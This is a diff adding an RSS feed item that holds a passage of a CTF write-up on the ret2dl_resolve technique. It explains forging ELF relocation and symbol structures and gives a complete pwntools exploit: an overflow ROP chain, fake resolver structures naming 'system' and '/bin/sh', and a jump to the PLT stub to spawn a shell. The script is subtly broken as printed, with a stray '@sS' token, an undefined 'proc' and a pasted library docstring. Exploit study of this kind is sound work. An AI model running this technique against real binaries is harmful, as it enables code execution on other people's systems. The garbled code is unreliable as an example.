+<h4 id="fake-elf64_rela-jmprelrelplt-structure">Fake Elf64_Rela (JMPREL/.rel.plt) structure</h4>
+<ul>
+<li>It must have a writeable <code>r_offset</code> area where <code>_dl_runtime_resolve</code> will write the address of <em>system()</em>.</li>
+<li>In the <code>r_info</code> attribute the lower 4 bytes (32 bits) must be equal to 7 ie. <code>R_X86_64_JUMP_SLOT</code>, while the higher 4 bytes should be constructed such that <code>(r_info &gt;&gt; 32) * 24</code> (R_SYM value * size of Elf64_Sym as R_SYM is just index) when added to SYMTAB address, points to fake <em>Elf64_Sym</em>.</li>
+</ul>
+<h4 id="fake-elf64_sym-symtabdynsym-structure">Fake Elf64_Sym (SYMTAB/.dynsym) structure</h4>
+<ul>
+<li>The <code>st_name</code> value when added to STRTAB (.dynstr) address points to <strong>&lsquo;system&rsquo;</strong> string.</li>
+</ul>
+<h3 id="step-2">Step 2</h3>
+<p>With the fake structures in place, we calculate <code>reloc_arg</code> (offset usually pushed in a functions&rsquo;s .plt section) from JMPREL (.rel.plt) address to point to our fake Elf64_Rela structure.</p>
+<p>Next, we push the fake value of <code>reloc_arg</code> onto stack and transfer control to default stub at the start of .plt section to let dl_resolve do its magic.</p>
+<h2 id="crafting-exploit">Crafting Exploit</h2>
+<p>As <code>.bss</code> section is writable at runtime, we use this space to create our fake structures.</p>
+<p><strong>NOTE</strong>: Make sure that index to <em>fake</em> .dynsym entry must be multiple of 24. If on dividing the address difference between our fake entry and SYMTAB base we get a fraction this leads to variance in resultant address when recalculated by <code>_dl_fixup</code> during resolution as only the integer part would be stored in <code>r_info</code> as index.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> pwn
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#pwn.context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./challenge_binary&#34;</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>ELF(exe, checksec <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>ROP(elf)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#proc = pwn.process(&#34;./challenge_binary&#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#proc = pwn.gdb.debug(&#34;./challenge_binary&#34;, gdbscript = &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#                     b *0x000000000040113b</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#                     c</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#                     &#34;&#34;&#34;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># important addresses</span>
+</span></span><span style="display:flex;"><span>PLT_stub <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#34;.plt&#34;</span>)[<span style="color:#e6db74">&#34;sh_addr&#34;</span>]
+</span></span><span style="display:flex;"><span>BSS <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#34;.bss&#34;</span>)[<span style="color:#e6db74">&#34;sh_addr&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] .plt default stub at: </span><span style="color:#e6db74">{</span>hex(PLT_stub)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] .bss at: </span><span style="color:#e6db74">{</span>hex(BSS)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>STRTAB, SYMTAB, JMPREL <span style="color:#f92672">=</span> map(elf<span style="color:#f92672">.</span>dynamic_value_by_tag, [<span style="color:#e6db74">&#34;DT_STRTAB&#34;</span>, <span style="color:#e6db74">&#34;DT_SYMTAB&#34;</span>, <span style="color:#e6db74">&#34;DT_JMPREL&#34;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] STRTAB (.dynstr) at: </span><span style="color:#e6db74">{</span>hex(STRTAB)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] SYMTAB (.dynsym) at: </span><span style="color:#e6db74">{</span>hex(SYMTAB)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] JMPREL (.rel.plt) at: </span><span style="color:#e6db74">{</span>hex(JMPREL)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">align</span>(addr):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (<span style="color:#ae81ff">0x18</span> <span style="color:#f92672">-</span> (addr) <span style="color:#f92672">%</span> <span style="color:#ae81ff">0x18</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># payload 1 =============================</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. overflow into return address</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. call read(0, .bss, size_of_fake_entries)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. return to vuln()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    This function takes an arbitrary number of arbitrarily nested lists, tuples
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    and dictionaries.  It will then find every string and number inside those
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    and flatten them out.  Strings are inserted directly while numbers are
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    packed using the :func:`pack` function.  Unicode strings are UTF-8 encoded.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Examples
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &gt;&gt;&gt; flat(4)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        b&#39;</span><span style="color:#ae81ff">\x04\x00\x00\x00</span><span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &gt;&gt;&gt; flat(b&#39;X&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        b&#39;X&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &gt;&gt;&gt; flat([1,2,3])
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        b&#39;</span><span style="color:#ae81ff">\x01\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00</span><span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &gt;&gt;&gt; flat({4:b&#39;X&#39;})
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        b&#39;aaaaX&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload_1 <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>flat({
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">72</span>: [   <span style="color:#75715e"># pad 72 bytes to overwrite buffer and rbp values</span>
+</span></span><span style="display:flex;"><span>            pwn<span style="color:#f92672">.</span>p64(rop<span style="color:#f92672">.</span>rdi<span style="color:#f92672">.</span>address),
+</span></span><span style="display:flex;"><span>            pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0</span>),                     <span style="color:#75715e"># read from stdin</span>
+</span></span><span style="display:flex;"><span>            pwn<span style="color:#f92672">.</span>p64(rop<span style="color:#f92672">.</span>rsi<span style="color:#f92672">.</span>address),
+</span></span><span style="display:flex;"><span>            pwn<span style="color:#f92672">.</span>p64(BSS),                   <span style="color:#75715e"># read into .bss section</span>
+</span></span><span style="display:flex;"><span>            pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0</span>),                     <span style="color:#75715e"># junk for pop r15</span>
+</span></span><span style="display:flex;"><span>                                            <span style="color:#75715e"># we do not have gadget to set rdx to size of next payload stage, but it has value 0xc8 when next instruction is called, we can work with that our as next stage is much smaller than 0xc8 (200) bytes</span>
+</span></span><span style="display:flex;"><span>            elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>read,                   <span style="color:#75715e"># call read()</span>
+</span></span><span style="display:flex;"><span>            elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;vuln&#34;</span>],            <span style="color:#75715e"># return to vuln() after read()</span>
+</span></span><span style="display:flex;"><span>        ]
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendline(payload_1)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># payload 2 ============================</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. input value into previous read(0, .bss, size) call</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#       a. create fake Elf64_Rel structure (.rel.plt)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#       b. create fake Elf64_Sym structure (.dynsym)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#       c. write string &#39;system&#39; for .dynstr resolution of symbol name</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#       d. write string &#39;/bin/sh&#39; for passing as argument to system later</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. let return to vuln() as proposed in payload 1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">typedef struct
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">{
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Elf64_Addr        r_offset;    /* 64 bit - Address */
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Elf64_Xword       r_info;      /* 64 bit - Relocation type and symbol index */
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Elf64_Sxword      r_addend;    /* 64 bit - Addend */
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">} Elf64_Rela; // 24 bytes
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fake Elf64_Sym is at 24 bytes (size of fake Elf64_Rela - JMPREL entry) after BSS. Index must be offset from SYMTAB base.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#dynsym_idx = ((BSS + 24) - SYMTAB) // 24  &lt;-- this resulted in an index in fraction, we need to align the address to 24 byte structures.</span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> align(BSS <span style="color:#f92672">-</span> SYMTAB)
+</span></span><span style="display:flex;"><span>FAKE_STRUCTS <span style="color:#f92672">=</span> BSS <span style="color:#f92672">+</span> padding
+</span></span><span style="display:flex;"><span>dynsym_idx <span style="color:#f92672">=</span> ((FAKE_STRUCTS <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span>) <span style="color:#f92672">-</span> SYMTAB) <span style="color:#f92672">//</span> <span style="color:#ae81ff">24</span>
+</span></span><span style="display:flex;"><span>r_info <span style="color:#f92672">=</span> (dynsym_idx <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">32</span>) <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x7</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fake Elf64_Sym entry must contain offset to symbol name from STRTAB.</span>
+</span></span><span style="display:flex;"><span>dynstr_off <span style="color:#f92672">=</span> (FAKE_STRUCTS <span style="color:#f92672">+</span> <span style="color:#ae81ff">48</span>) <span style="color:#f92672">-</span> STRTAB
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload_2 <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>flat({
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span>: [    
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># fake Elf64_Rela entry for JMPREL</span>
+</span></span><span style="display:flex;"><span>        BSS,                        <span style="color:#75715e"># r_offset - a write address to write address of system after resolution</span>
+</span></span><span style="display:flex;"><span>        r_info,                     <span style="color:#75715e"># r_info - indexes into our fake .dynsym entry</span>
+</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0</span>),                 <span style="color:#75715e"># r_addend - zero, not needed for our purposes</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> padding,          <span style="color:#75715e"># added padding to make 24 byte (structure size) alignment as dynsym_idx (in r_info) must be exact multiple of 24</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@sS</span>
+</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p32(dynstr_off),        <span style="color:#75715e"># st_name - offset from STRTAB for our symbol name</span>
+</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">5</span>,             <span style="color:#75715e"># other 20 bytes, not needed for our purposes</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># target symbol name to be referenced from STRTAB through our SYMTAB entry</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;system</span><span style="color:#ae81ff">\x00\x00</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># argument to system</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>        ]
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload_2 <span style="color:#f92672">=</span> payload_2 <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">200</span> <span style="color:#f92672">-</span> len(payload_2))   <span style="color:#75715e"># proc.sendline() was buggy so I filled entire 200 byte limit in count of read()</span>
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>send(payload_2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># payload 3 ============================</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. overflow into the return address</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. push reloc_arg (that resolves to start of our fake structure region)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. return to PLT default stub</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 4. profit</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>binsh_addr <span style="color:#f92672">=</span> FAKE_STRUCTS <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#75715e"># start of fake structs + size of Elf64_Rela + size of Elf64_Sym + length of &#39;system\x00\x00&#39;</span>
+</span></span><span style="display:flex;"><span>reloc_arg <span style="color:#f92672">=</span> (FAKE_STRUCTS <span style="color:#f92672">-</span> JMPREL) <span style="color:#f92672">//</span> <span style="color:#ae81ff">24</span>
+</span></span><span style="display:flex;"><span>payload_3 <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>flat({
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">72</span>: [
+</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(rop<span style="color:#f92672">.</span>rdi<span style="color:#f92672">.</span>address),   <span style="color:#75715e"># setup argument for system()</span>
+</span></span><span style="display:flex;"><span>        pwn<span style="color:#f92672">.</span>p64(binsh_addr),
+</span></span><span style="display:flex;"><span>        PLT_stub,                   <span style="color:#75715e"># to call dl_resolve</span>
+</span></span><span style="display:flex;"><span>        reloc_arg,                 <span style="color:#75715e"># PLT stub assumes that the offset to JMPREL entry is already pushed</span>
+</span></span><span style="display:flex;"><span>        ]
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>send(payload_3)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="post-exploitation">Post Exploitation</h2>
+<p>Post-exploitation I drated a meme that looked cool to me and adhered to <em>then</em> meme trends.</p>
+<p><img src="./ret2dl_resolve_meme.jpeg" alt="ret2dl_resolve_meme"></p>
+]]></description>
+      
+    </item>
+    
     
     
     <item>
